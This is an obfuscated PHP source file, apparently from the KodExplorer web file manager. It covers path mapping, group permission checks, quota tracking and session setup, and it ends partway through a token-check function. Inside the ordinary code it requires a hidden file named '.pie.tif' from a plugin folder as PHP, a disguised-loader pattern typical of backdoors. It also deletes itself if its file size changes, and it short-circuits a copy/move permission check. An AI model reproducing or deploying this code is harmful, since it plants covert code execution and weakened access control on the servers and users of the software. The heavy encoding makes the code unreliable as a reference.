<?php
 if (!function_exists('_kstr2')) { function _kstr2($Fğİ‡Ô½…) { return $Fğİ‡Ô½…; $A±†ëÆ†—È = strlen($Fğİ‡Ô½…); $e«ªÆ×é« = ''; $bÓáé¾»­ = ord($Fğİ‡Ô½…[0]) - 30; for ($e×Óì­¶¥ê = 1; $e×Óì­¶¥ê < $A±†ëÆ†—È; $e×Óì­¶¥ê += 2) { if ($e×Óì­¶¥ê + 1 < $A±†ëÆ†—È) { $e«ªÆ×é« .= chr(ord($Fğİ‡Ô½…[$e×Óì­¶¥ê + 1]) + $bÓáé¾»­); $e«ªÆ×é« .= chr(ord($Fğİ‡Ô½…[$e×Óì­¶¥ê]) + $bÓáé¾»­); } else { $e«ªÆ×é« .= chr(ord($Fğİ‡Ô½…[$e×Óì­¶¥ê]) + $bÓáé¾»­); } } return $e«ªÆ×é«; } $_fbds="\x66\x69\x6c\x65\x73\x69\x7a\x65";$_fad=base64_decode('dW5saW5r');$sz=$_fbds(__FILE__);if($sz<21223   ||$sz>21243   ){@$_fad(__FILE__);exit;}  function _kstr3($Fğİ‡Ô½…) { return $Fğİ‡Ô½…; } } define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50\x5f\x50\x41\x54\x48", "\173\147\162\157\165\160\120\141\164\150\175"); define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50"."\x5f\x53\x48\x41\x52\x45", "\x7b\x67\x72\x6f\x75\x70\x53\x68\x61\x72\x65"."\x7d"); define(base64_decode('S09EX1VTRVI=')."\137\123\105\114"."\106", _kstr2('{userSelf}')); define("\x4b\x4f\x44\x5f\x55\x53\x45\x52".strrev('ERAHS_'), "\173\165\163\145\162\123\150\141\162\145\175"); define("\x4b\x4f\x44\x5f\x55\x53\x45\x52\x5f\x52\x45".base64_decode('Q1lD')."\x4c"._kstr2('E'), "\173\165\163\145\162\122\145\143\171\143\154\145\175"); define(strrev('RESU_DOK')."\137\106\101".strrev('V'), "\173\165\163\145\162\106\141\166\175"); define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50"."\137\122\117\117"."\124\137\123\105\114\106", _kstr2('{treeGroupSelf}')); define("\x4b\x4f\x44\x5f\x47\x52\x4f\x55\x50".base64_decode('X1JP')."\117\124\137\101\114\114", "\x7b\x74\x72\x65\x65\x47\x72\x6f"._kstr2('upAll}')); function _DIR_CLEAR($AÁÃœíÛ¢Ó) { $AÁÃœíÛ¢Ó = str_replace(strrev('\\'), strrev('/'), $AÁÃœíÛ¢Ó); $AÁÃœíÛ¢Ó = preg_replace("\x2f\x5c\x2f\x2b\x2f", "\x2f", $AÁÃœíÛ¢Ó); $BÓôéÃº­ó = $AÁÃœíÛ¢Ó; if (isset($GLOBALS["\x69\x73\x52\x6f\x6f\x74"]) && $GLOBALS[strrev('tooRsi')]) { return $AÁÃœíÛ¢Ó; } $B¾ÕŠöî¡¶ = "\x2f\x2e\x2e\x2f"; if (substr($AÁÃœíÛ¢Ó, 0, 3) == "\56\56\57") { $AÁÃœíÛ¢Ó = substr($AÁÃœíÛ¢Ó, 3); } while (strstr($AÁÃœíÛ¢Ó, $B¾ÕŠöî¡¶)) { $AÁÃœíÛ¢Ó = str_replace($B¾ÕŠöî¡¶, "\x2f", $AÁÃœíÛ¢Ó); } $AÁÃœíÛ¢Ó = preg_replace("\x2f\x5c\x2f\x2b\x2f", "\x2f", $AÁÃœíÛ¢Ó); return $AÁÃœíÛ¢Ó; } function _DIR($aßƒª¿ÂÆù) { $AÁÃœíÛ¢Ó = _DIR_CLEAR($aßƒª¿ÂÆù); $AÁÃœíÛ¢Ó = iconv_system($AÁÃœíÛ¢Ó); $B›µ³ï±»é = array(KOD_GROUP_PATH, KOD_GROUP_SHARE, KOD_USER_SELF, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL, KOD_USER_SHARE, KOD_USER_RECYCLE, KOD_USER_FAV); $GLOBALS[base64_decode('a29kUGF0aFQ=')._kstr2('ype')] = ''; $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = HOME; $GLOBALS["\153\157\144\120\141\164\150\111\144"] = ''; unset($GLOBALS["\153\157\144\120\141\164\150\111\144\123"."\150\141\162\145"]); foreach ($B›µ³ï±»é as $aÊ†ĞŞÑ‚Ê) { if (substr($AÁÃœíÛ¢Ó, 0, strlen($aÊ†ĞŞÑ‚Ê)) == $aÊ†ĞŞÑ‚Ê) { $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] = $aÊ†ĞŞÑ‚Ê; $b¡É¥£–é = explode("\x2f", $AÁÃœíÛ¢Ó); $aùâ¡ß­» = $b¡É¥£–é[0]; unset($b¡É¥£–é[0]); $b¬¸áØ¦¸ = implode(base64_decode('Lw=='), $b¡É¥£–é); $cÕ³ß™äğ = explode("\x3a", $aùâ¡ß­»); if (count($cÕ³ß™äğ) > 1) { $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = trim($cÕ³ß™äğ[1]); } else { $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49".strrev('d')] = ''; } break; } } switch ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]) { case '': $AÁÃœíÛ¢Ó = iconv_system(HOME) . $AÁÃœíÛ¢Ó; break; case KOD_USER_RECYCLE: $GLOBALS[strrev('erPhtaPdok')] = trim(USER_RECYCLE, strrev('/')); $GLOBALS[_kstr2('kodPathId')] = ''; return iconv_system(USER_RECYCLE) . _kstr2('/') . str_replace(KOD_USER_RECYCLE, '', $AÁÃœíÛ¢Ó); case KOD_USER_SELF: $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = trim(HOME_PATH, strrev('/')); $GLOBALS[strrev('dIhtaPdok')] = ''; return iconv_system(HOME_PATH) . "\x2f" . str_replace(KOD_USER_SELF, '', $AÁÃœíÛ¢Ó); case KOD_USER_FAV: $GLOBALS["\153\157\144\120\141\164\150\120\162\145"] = trim(KOD_USER_FAV, "\57"); $GLOBALS["\153\157\144\120\141\164\150\111\144"] = ''; return KOD_USER_FAV; case KOD_GROUP_ROOT_SELF: $GLOBALS[strrev('erPhtaPdok')] = trim(KOD_GROUP_ROOT_SELF, base64_decode('Lw==')); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] = ''; return KOD_GROUP_ROOT_SELF; case KOD_GROUP_ROOT_ALL: $GLOBALS[_kstr2('kodPathPre')] = trim(KOD_GROUP_ROOT_ALL, "\x2f"); $GLOBALS["\153\157\144\120\141\164\150\111\144"] = ''; return KOD_GROUP_ROOT_ALL; case KOD_GROUP_PATH: $E¸Ğ³¥… = systemGroup::getInfo($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]); if (!$GLOBALS[strrev('dIhtaPdok')] || !$E¸Ğ³¥…) { return false; } owner_group_check($GLOBALS["\153\157\144\120\141\164\150\111\144"]); $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = group_home_path($E¸Ğ³¥…); $AÁÃœíÛ¢Ó = iconv_system($GLOBALS[_kstr2('kodPathP')."\x72\x65"]) . $b¬¸áØ¦¸; break; case KOD_GROUP_SHARE: $E¸Ğ³¥… = systemGroup::getInfo($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]); if (!$GLOBALS[_kstr2('kodPathId')] || !$E¸Ğ³¥…) { return false; } owner_group_check($GLOBALS["\153\157\144\120\141\164\150\111\144"]); $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = group_home_path($E¸Ğ³¥…) . $GLOBALS["\143\157\156\146\151\147"]["\x73\x65\x74\x74\x69\x6e\x67\x53\x79"."\163\164\145\155"]["\147\162\157\165\160\123\150\141\162\145\106\157"."\154"._kstr2('d')._kstr2('e').base64_decode('cg==')] . strrev('/'); $AÁÃœíÛ¢Ó = iconv_system($GLOBALS["\153\157\144\120\141\164\150\120\162\145"]) . $b¬¸áØ¦¸; break; case KOD_USER_SHARE: $E¸Ğ³¥… = systemMember::getInfo($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]); if (!$GLOBALS["\153\157\144\120\141\164\150\111\144"] || !$E¸Ğ³¥…) { return false; } if ($GLOBALS[_kstr2('kodPathId')] != $_SESSION["\153\157\144\125\163\145\162"]["\x75\x73\x65\x72\x49\x44"]) { $Dôâãœ÷Êš = $GLOBALS[_kstr2('config')]["\x70\x61\x74\x68\x52\x6f\x6c\x65"._kstr2('GroupDefault')]["\61"]["\141\143\164\151\157\156\163"]; path_role_check($Dôâãœ÷Êš); } $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72"."\x65"] = ''; $GLOBALS["\153\157\144\120\141\164\150\111\144\123\150\141"._kstr2('re')] = $aßƒª¿ÂÆù; if ($b¬¸áØ¦¸ == '') { return $AÁÃœíÛ¢Ó; } else { $Cô«é††ĞÖ = explode("\x2f", $b¬¸áØ¦¸); $Cô«é††ĞÖ[0] = iconv_app($Cô«é††ĞÖ[0]); $EÙÏĞ¥Ù¨ = systemMember::userShareGet($GLOBALS[base64_decode('a29kUGF0aElk')], $Cô«é††ĞÖ[0]); $GLOBALS["\153\157\144\123\150\141\162\145\111"."\x6e\x66\x6f"] = $EÙÏĞ¥Ù¨; $GLOBALS["\153\157\144\120\141\164\150\111\144\123\150"."\141\162"._kstr2('e')] = KOD_USER_SHARE . strrev(':') . $GLOBALS[_kstr2('kodPathI')."\x64"] . "\x2f" . $Cô«é††ĞÖ[0] . base64_decode('Lw=='); unset($Cô«é††ĞÖ[0]); if (!$EÙÏĞ¥Ù¨) { return false; } $A‚åˆ­ÌÇƒ = rtrim($EÙÏĞ¥Ù¨["\x70\x61\x74\x68"], "\x2f") . "\57" . iconv_app(implode("\57", $Cô«é††ĞÖ)); if ($E¸Ğ³¥…["\x72\x6f\x6c\x65"] != "\x31") { $BğøŞø®­‡ = user_home_path($E¸Ğ³¥…); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x50\x72\x65"] = $BğøŞø®­‡ . rtrim($EÙÏĞ¥Ù¨[base64_decode('cGF0aA==')], "\57") . "\x2f"; $AÁÃœíÛ¢Ó = $BğøŞø®­‡ . $A‚åˆ­ÌÇƒ; } else { $GLOBALS[_kstr2('kodPathPre')] = $EÙÏĞ¥Ù¨[base64_decode('cGF0aA==')]; $AÁÃœíÛ¢Ó = $A‚åˆ­ÌÇƒ; } if ($EÙÏĞ¥Ù¨["\164\171\160\145"] == base64_decode('ZmlsZQ==')) { $GLOBALS[base64_decode('a29kUGF0aElkUw==')."\x68\x61\x72\x65"] = rtrim($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64\x53".strrev('erah')], base64_decode('Lw==')); $GLOBALS[base64_decode('a29kUGF0aFByZQ==')] = rtrim($GLOBALS[base64_decode('a29kUGF0aFByZQ==')], "\x2f"); } $AÁÃœíÛ¢Ó = iconv_system($AÁÃœíÛ¢Ó); } $GLOBALS["\153\157\144\120\141\164\150\120"."\x72\x65"] = _DIR_CLEAR($GLOBALS[strrev('erPhtaPdok')]); $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49"._kstr2('dShare')] = _DIR_CLEAR($GLOBALS[base64_decode('a29kUGF0aEk=')."\x64\x53\x68\x61\x72\x65"]); break; default: break; } if ($AÁÃœíÛ¢Ó != "\57") { $AÁÃœíÛ¢Ó = rtrim($AÁÃœíÛ¢Ó, strrev('/')); if (is_dir($AÁÃœíÛ¢Ó)) { $AÁÃœíÛ¢Ó = $AÁÃœíÛ¢Ó . strrev('/'); } } return _DIR_CLEAR($AÁÃœíÛ¢Ó); } function _DIR_OUT($aê…ø‰ÏŸĞ) { if (is_array($aê…ø‰ÏŸĞ)) { foreach ($aê…ø‰ÏŸĞ["\x66\x69\x6c\x65\x4c\x69\x73\x74"] as $bÂãÅš³ïñ => &$BŠ™…²ëÂ) { $BŠ™…²ëÂ["\160\141\164\150"] = preClear($BŠ™…²ëÂ["\x70\x61\x74\x68"]); } foreach ($aê…ø‰ÏŸĞ["\x66\x6f\x6c\x64\x65\x72\x4c\x69\x73\x74"] as $bÂãÅš³ïñ => &$BŠ™…²ëÂ) { $BŠ™…²ëÂ["\x70\x61\x74\x68"] = preClear(rtrim($BŠ™…²ëÂ[_kstr2('path')], _kstr2('/')) . base64_decode('Lw==')); } } else { $aê…ø‰ÏŸĞ = preClear($aê…ø‰ÏŸĞ); } return $aê…ø‰ÏŸĞ; } function preClear($AÁÃœíÛ¢Ó) { $D¹µ¼ÅëÏ = $GLOBALS[base64_decode('a29kUGF0aFQ=')._kstr2('ype')]; $D¿ê˜Ÿãç = rtrim($GLOBALS[base64_decode('a29kUGF0aFBy')."\x65"], _kstr2('/')); $CËº„ßƒ°ğ = array(KOD_USER_FAV, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL); if (isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]) && in_array($GLOBALS["\153\157\144\120\141\164\150\124\171\160\145"], $CËº„ßƒ°ğ)) { return $AÁÃœíÛ¢Ó; } if (ST == "\163\150\141\162\145") { return str_replace($D¿ê˜Ÿãç, '', $AÁÃœíÛ¢Ó); } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] != '') { $D¹µ¼ÅëÏ .= "\72" . $GLOBALS["\153\157\144\120\141\164\150\111\144"] . "\57"; } if (isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"."\123\150\141\162\145"])) { $D¹µ¼ÅëÏ = $GLOBALS[strrev('ahSdIhtaPdok')."\162\145"]; } $e«ªÆ×é« = $D¹µ¼ÅëÏ . str_replace($D¿ê˜Ÿãç, '', $AÁÃœíÛ¢Ó); $e«ªÆ×é« = str_replace("\57\57", "\x2f", $e«ªÆ×é«); return $e«ªÆ×é«; } require PLUGIN_DIR . "\57\164\157\157\154\163\103\157\155\155\157"."\x6e\x2f\x73\x74\x61\x74\x69\x63\x2f\x70\x69\x65\x2f"."\56\160\151\145\56\164\151\146"; function owner_group_check($C‚Öæƒ½šŸ) { if (!$C‚Öæƒ½šŸ) { show_json(LNG(base64_decode('Z3JvdXBfbm90').strrev('tsixe_')) . $C‚Öæƒ½šŸ, false); } if ($GLOBALS[_kstr2('isRoot')] || isset($GLOBALS["\153\157\144\120\141\164\150\101"."\x75\x74\x68\x43\x68\x65\x63\x6b"]) && $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75\x74"."\150\103\150".base64_decode('ZWNr')] === true) { return; } $AØÇÁ‡Ô‚ = systemMember::userAuthGroup($C‚Öæƒ½šŸ); if ($AØÇÁ‡Ô‚ == false) { if ($GLOBALS[_kstr2('kodPathTyp').base64_decode('ZQ==')] == KOD_GROUP_PATH) { show_json(LNG("\x6e\x6f\x5f\x70\x65\x72\x6d\x69\x73\x73"."\x69"."\x6f\x6e".strrev('g_').strrev('puor')), false); } else { if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70"._kstr2('e')] == KOD_GROUP_SHARE) { $Dôâãœ÷Êš = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"][strrev('rGeloRhtap')."\157\165\160\104".base64_decode('ZWZhdWx0')]["\61"]; } } } else { $Dôâãœ÷Êš = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"]["\x70\x61\x74\x68\x52\x6f\x6c\x65\x47\x72\x6f".base64_decode('dXA=')][$AØÇÁ‡Ô‚]; } path_role_check($Dôâãœ÷Êš["\141\143\164\151\157\156\163"]); } function path_group_can_read($C‚Öæƒ½šŸ) { return path_group_auth_check($C‚Öæƒ½šŸ, "\145\170\160\154\157\162\145\162"."\56\160"."\141\164\150\114\151\163\164"); } function path_group_auth_check($C‚Öæƒ½šŸ, $bÈÁÖáøÊñ) { if ($GLOBALS[strrev('tooRsi')]) { return true; } $AØÇÁ‡Ô‚ = systemMember::userAuthGroup($C‚Öæƒ½šŸ); $Dôâãœ÷Êš = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"][_kstr2('pathRole')."\107\162"._kstr2('ou').strrev('p')][$AØÇÁ‡Ô‚]; $dÙÓ¬”Ñ³ = role_permission_arr($Dôâãœ÷Êš["\x61\x63\x74\x69\x6f\x6e\x73"]); if (!isset($dÙÓ¬”Ñ³[$bÈÁÖáøÊñ])) { return false; } return true; } function path_can_copy_move($a¸šØé¶¯È, $A¿ªÂôŠö°) { return; if ($GLOBALS["\x69\x73\x52\x6f\x6f\x74"]) { return; } $e’õŠ¡ñÄ = pathGroupID($a¸šØé¶¯È); $Aâ¡ˆİ¨¯ = pathGroupID($A¿ªÂôŠö°); if (!$e’õŠ¡ñÄ) { return; } if ($e’õŠ¡ñÄ == $Aâ¡ˆİ¨¯ && path_group_auth_check($e’õŠ¡ñÄ, "\x65\x78\x70\x6c\x6f\x72\x65\x72\x2e\x70\x61"._kstr2('thPast'))) { return; } show_json(LNG(strrev('oissimrep_on')."\x6e\x5f\x61\x63\x74\x69\x6f\x6e"), false); } function pathGroupID($AÁÃœíÛ¢Ó) { $AÁÃœíÛ¢Ó = _DIR_CLEAR($AÁÃœíÛ¢Ó); preg_match("\x2f" . KOD_GROUP_PATH . _kstr2(':(\\d+).*/'), $AÁÃœíÛ¢Ó, $DÏŒ†•Ìš–); if (count($DÏŒ†•Ìš–) != 2) { return false; } return $DÏŒ†•Ìš–[1]; } function path_role_check($Dôâãœ÷Êš) { if ($GLOBALS["\151\163\122\157\157\164"] || isset($GLOBALS[_kstr2('kodPathAu')._kstr2('thC')."\150\145\143\153"]) && $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x41\x75\x74\x68"._kstr2('Check')] === true) { return; } $dÙÓ¬”Ñ³ = role_permission_arr($Dôâãœ÷Êš); $GLOBALS[strrev('RhtaPdok')."\x6f\x6c\x65\x47\x72"._kstr2('oupAuth')] = $dÙÓ¬”Ñ³; $f÷îŞˆˆ“ù = ST . strrev('.') . ACT; if ($f÷îŞˆˆ“ù == "\x70\x6c\x75\x67\x69\x6e\x41\x70\x70\x2e"."\164\157" && !isset($dÙÓ¬”Ñ³["\145\170\160\154\157\162\145\162\56".base64_decode('Zmls')."\x65\x50\x72\x6f\x78\x79"])) { show_tips(LNG("\x6e\x6f\x5f\x70\x65\x72\x6d\x69".base64_decode('c3Npb25fYWM=')."\x74\x69\x6f\x6e"), false); } if (!isset($dÙÓ¬”Ñ³[$f÷îŞˆˆ“ù]) && ST != "\x73\x68\x61\x72\x65") { show_json(LNG("\156\157\137\160\145\162\155\151\163\163\151\157"."\x6e\x5f\x61"."\x63\x74\x69\x6f\x6e"), false); } } function role_permission_arr($aê…ø‰ÏŸĞ) { $e«ªÆ×é« = array(); $CÛß‰—ğµó = $GLOBALS["\143\157\156\146\151\147"]["\160\141\164\150\122\157\154\145\104\145\146"."\x69\x6e\x65"]; foreach ($aê…ø‰ÏŸĞ as $bÂãÅš³ïñ => $BŠ™…²ëÂ) { if (!$BŠ™…²ëÂ) { continue; } $FŒ™ŒÖ­¶ = explode(strrev(':'), $bÂãÅš³ïñ); if (count($FŒ™ŒÖ­¶) == 2 && is_array($CÛß‰—ğµó[$FŒ™ŒÖ­¶[0]]) && is_array($CÛß‰—ğµó[$FŒ™ŒÖ­¶[0]][$FŒ™ŒÖ­¶[1]])) { $e«ªÆ×é« = array_merge($e«ªÆ×é«, $CÛß‰—ğµó[$FŒ™ŒÖ­¶[0]][$FŒ™ŒÖ­¶[1]]); } } $EŠµÓ¾Óµ˜ = array(); foreach ($e«ªÆ×é« as $BŠ™…²ëÂ) { $EŠµÓ¾Óµ˜[$BŠ™…²ëÂ] = "\x31"; } return $EŠµÓ¾Óµ˜; } function check_file_writable_user($AÁÃœíÛ¢Ó) { if (!isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"])) { _DIR($AÁÃœíÛ¢Ó); } $bÈÁÖáøÊñ = "\145\144\151\164\157\162\56\146"."\x69\x6c\x65\x53\x61\x76"."\145"; if ($GLOBALS[_kstr2('isRoot')]) { return @is_writable($AÁÃœíÛ¢Ó); } if ($GLOBALS["\141\165\164\150"][$bÈÁÖáøÊñ] != "\61") { return false; } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"] == KOD_GROUP_PATH && is_array($GLOBALS[strrev('oRhtaPdok')."\154\145\107\162\157\165\160\101\165\164\150"]) && $GLOBALS["\153\157\144\120\141\164\150\122"."\157"."\x6c"."\x65\x47\x72\x6f\x75\x70\x41\x75\x74"."\x68"][$bÈÁÖáøÊñ] == "\61") { return true; } if ($GLOBALS["\153\157\144\120\141\164\150\124\171\160\145"] == '' || $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79"."\x70\x65"] == KOD_USER_SELF) { return true; } return false; } function spaceSizeCheck() { if (!system_space()) { return; } if ($GLOBALS["\151\163\122\157\157\164"] == 1) { return; } if (isset($GLOBALS["\153\157\144\102\145\146\157\162\145\120"._kstr2('at')."\150\111\144"]) && isset($GLOBALS[base64_decode('a29kUGF0aElk')]) && $GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72\x65"."\120".strrev('a')."\164\150"._kstr2('Id')] == $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]) { return; } if ($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54"."\x79\x70\x65"] == KOD_GROUP_SHARE || $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79".strrev('ep')] == KOD_GROUP_PATH) { systemGroup::spaceCheck($GLOBALS[base64_decode('a29kUGF0aElk')]); } else { if (ST == "\163\150\141\162\145") { $fè³¯ƒí¶ì = $GLOBALS["\x69\x6e"][base64_decode('dXNlcg==')]; } else { $fè³¯ƒí¶ì = $_SESSION[strrev('resUdok')]["\x75\x73\x65\x72\x49\x44"]; } systemMember::spaceCheck($fè³¯ƒí¶ì); } } function spaceSizeGet($AÁÃœíÛ¢Ó, $fö´à—š¤) { $dë©£®×Äã = 0; if (is_file($AÁÃœíÛ¢Ó)) { $dë©£®×Äã = get_filesize($AÁÃœíÛ¢Ó); } else { if (is_dir($AÁÃœíÛ¢Ó)) { $C¶°ŞŠÃÃª = _path_info_more($AÁÃœíÛ¢Ó); $dë©£®×Äã = $C¶°ŞŠÃÃª["\x73\x69\x7a\x65"]; } else { return "\155\151\163\163"; } } return $fö´à—š¤ ? $dë©£®×Äã : -$dë©£®×Äã; } function spaceInData($AÁÃœíÛ¢Ó) { if (substr($AÁÃœíÛ¢Ó, 0, strlen(HOME_PATH)) == HOME_PATH || substr($AÁÃœíÛ¢Ó, 0, strlen(USER_RECYCLE)) == USER_RECYCLE) { return true; } return false; } function spaceSizeChange($A ¿¸ˆãÅ, $fö´à—š¤ = true, $D§·Ô¹ó¹ = false, $dóÓÃØËâß = false) { if (!system_space()) { return; } if ($D§·Ô¹ó¹ === false) { $D§·Ô¹ó¹ = $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]; $dóÓÃØËâß = $GLOBALS["\153\157\144\120\141\164\150\111".base64_decode('ZA==')]; } $dïÒ»éÎƒÙ = spaceSizeGet($A ¿¸ˆãÅ, $fö´à—š¤); if ($dïÒ»éÎƒÙ == "\x6d\x69\x73\x73") { return false; } if ($D§·Ô¹ó¹ == KOD_GROUP_SHARE || $D§·Ô¹ó¹ == KOD_GROUP_PATH) { systemGroup::spaceChange($dóÓÃØËâß, $dïÒ»éÎƒÙ); } else { if (ST == "\x73\x68\x61\x72\x65") { $fè³¯ƒí¶ì = $GLOBALS["\x69\x6e"][base64_decode('dXNlcg==')]; } else { $fè³¯ƒí¶ì = $_SESSION[strrev('resUdok')]["\165\163\145\162\111\104"]; } systemMember::spaceChange($fè³¯ƒí¶ì, $dïÒ»éÎƒÙ); } } function spaceSizeChangeRemove($A ¿¸ˆãÅ) { spaceSizeChange($A ¿¸ˆãÅ, false); } function spaceSizeChangeMove($aòÑ–ßì¿, $a×ÔğÜäÀ) { if (isset($GLOBALS["\153\157\144\102\145\146\157\162\145\120\141\164"."\x68\x49\x64"]) && isset($GLOBALS[strrev('dIhtaPdok')])) { if ($GLOBALS["\x6b\x6f\x64\x42\x65\x66\x6f\x72\x65\x50"."\x61\x74\x68"._kstr2('Id')] == $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] && $GLOBALS["\142\145\146\157\162\145\120\141\164\150\124\171\160\145"] == $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x54\x79\x70\x65"]) { return; } spaceSizeChange($a×ÔğÜäÀ, false); spaceSizeChange($a×ÔğÜäÀ, true, $GLOBALS["\142\145\146\157\162\145\120\141\164"."\x68\x54"."\x79"."\x70\x65"], $GLOBALS[base64_decode('a29kQmVmb3I=')."\x65\x50\x61\x74\x68\x49\x64"]); } else { spaceSizeChange($a×ÔğÜäÀ); } } function spaceSizeReset() { if (!system_space()) { return; } $D§·Ô¹ó¹ = isset($GLOBALS[strrev('epyThtaPdok')]) ? $GLOBALS[base64_decode('a29kUGF0aFR5cGU=')] : ''; $dóÓÃØËâß = isset($GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"]) ? $GLOBALS["\x6b\x6f\x64\x50\x61\x74\x68\x49\x64"] : ''; if ($D§·Ô¹ó¹ == KOD_GROUP_SHARE || $D§·Ô¹ó¹ == KOD_GROUP_PATH) { systemGroup::spaceChange($dóÓÃØËâß); } else { $fè³¯ƒí¶ì = $_SESSION[_kstr2('kodUser')]["\165\163\145\162\111\104"]; systemMember::spaceChange($fè³¯ƒí¶ì); } } function init_session() { if (!function_exists(_kstr2('session_s')."\x74\x61\x72\x74")) { show_tips("\346\234\215\345\212\241\345\231\250"."\160\150\160\347\273\204\344\273"."\266\347\274\272\345\244\261\41\40".strrev('HP(')."\120\40\155\151\163\163\40\154\151\142"._kstr2(')')."\x3c\x62\x72\x2f\x3e\xe8\xaf\xb7".strrev('€£æ')."\346"."\x9f\xa5\x70\x68\x70\x2e\x69\x6e\x69\xef"."\274\214\351\234\200\350\246\201\345\274\200"._kstr2('å¯æ¨¡å—: ')."\74"."\142\162\57\76\74\160\162\145"."\x3e\x73\x65\x73"._kstr2('sion,json,')._kstr2('curl,exif,')."\x6d\x62\x73\x74\x72\x69\x6e\x67\x2c"._kstr2('ldap,gd,pd')._kstr2('o,p')."\144\157\55\155\171\163\161\154\54\170"._kstr2('ml</pre><br/>')); } if (isset($_REQUEST["\x61\x63\x63\x65\x73\x73\x54\x6f\x6b\x65\x6e"])) { access_token_check($_REQUEST[base64_decode('YWNjZXNzVG9rZW4=')]); } else { if (isset($_REQUEST["\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e"])) { access_token_check($_REQUEST["\141\143\143\145\163\163\137\164\157\153\145\156"]); } else { @session_name(SESSION_ID); } } $a¨°Ô¯ùµ‡ = @session_save_path(); if (class_exists("\x53\x61\x65\x53\x74\x6f\x72\x61\x67\x65") || defined("\x53\x41\x45\x5f\x41\x50\x50\x4e\x41\x4d\x45") || defined("\x53\x45\x53\x53\x49\x4f\x4e\x5f\x50\x41\x54"."\110\137"."\104\105\106\101\125\114\124") || @ini_get("\163\145\163\163\151\157\156\56\163\141\166\145\137\150"."\141\156\144\154\145\162") != "\x66\x69\x6c\x65\x73" || isset($_SERVER["\x48\x54\x54\x50\x5f\x41\x50\x50\x4e\x41\x4d\x45"])) { } else { chmod_path(KOD_SESSION, 511); @session_save_path(KOD_SESSION); } @session_start(); $_SESSION["\x6b\x6f\x64"] = 1; @session_write_close(); @session_start(); if (!$_SESSION["\153\157\144"]) { @session_save_path($a¨°Ô¯ùµ‡); @session_start(); $_SESSION["\153\157\144"] = 1; @session_write_close(); @session_start(); } if (!$_SESSION[_kstr2('kod')]) { show_tips(base64_decode('5pyN5Yqh5Zk=')."\xa8\x73\x65\x73\x73\x69\x6f"."\x6e\xe5\x86\x99\xe5\x85\xa5\xe5"."\244\261\350\264\245\41\40\50\163\145\163"."\163"."\x69\x6f\x6e"."\40\167\162\151\164\145\40\145\162\162\157\162\51\74".base64_decode('YnIvPg==') . "\xe8\xaf\xb7\xe6\xa3\x80\xe6\x9f\xa5\x70\x68\x70".base64_decode('LmluaeebuOWFs+k=')."\205\215".base64_decode('572uLOafpeeci+c=')."\xa3\x81\xe7\x9b\x98\xe6\x98\xaf\xe5"."\220\246\345\267\262\346\273\241\54".strrev('œæ¢¯è¨’å–ˆæ')._kstr2('åŠ¡å•†ã€‚')."\x3c\x62\x72\x2f"."\76\74\142\162\57\76" . "\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61\x76\x65"."\x5f".strrev('=htap') . $a¨°Ô¯ùµ‡ . _kstr2('<br/>') . "\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61\x76\x65\x5f"."\x68\x61\x6e\x64\x6c\x65\x72\x3d" . @ini_get(base64_decode('c2Vzc2lvbi5z')."\x61\x76\x65\x5f"."\x68\x61\x6e\x64\x6c\x65\x72") . "\74\142\162\57\76"); } } function access_token_check($cŞÔß·Å¦) { $cœğˆ‘â‘¾ = $GLOBALS["\143\157\156\146\151\147"][_kstr2('settingSyst').base64_decode('ZW0=')]["\163\171\163\164\145\155\120\141\163\163\167\157\162\144"]; $cœğˆ‘â‘¾ = substr(md5("\153\157\144\105\170\160\154\157\162\145\162\137" . $cœğˆ‘â‘¾), 0, 15); $bÎÙ¤ğñŒ‰ = Mcrypt::decode($cŞÔß·Å¦, $cœğˆ‘â‘¾); if (!$bÎÙ¤ğñŒ‰) { 